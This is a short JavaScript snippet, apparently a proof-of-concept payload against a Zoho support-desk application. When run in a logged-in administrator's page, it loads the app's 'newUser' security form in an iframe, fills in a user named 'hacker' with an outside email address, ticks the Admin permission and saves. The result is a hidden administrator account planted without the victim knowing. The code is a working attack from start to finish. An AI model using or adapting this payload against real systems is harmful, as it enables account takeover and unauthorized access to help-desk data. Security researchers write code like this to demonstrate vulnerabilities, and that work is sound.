//var statusVal = getClosedLabel();assignValue('Cases','6b28c32dddd03edf3e9898aa0dd1498de612657a51fd5fbe',encodeURIComponent(statusVal),'Status');

var iframe = jQuery("<iframe></iframe>");
jQuery(iframe).attr("src","Security.do?actionName=newUser&frameorigin=https://supportdesk.localzoho.com");
jQuery(iframe).attr("onload","adduser_hack()");

jQuery("body").append(iframe);






function adduser_hack(){
jQuery(iframe).contents().find('#lastName').val("hacker");
jQuery(iframe).contents().find('#j_username').val("ajaytestacc@gmail.com");
jQuery(iframe).contents().find("#perType_Admin").click();
jQuery(iframe).contents().find("#savebtn").click();
}
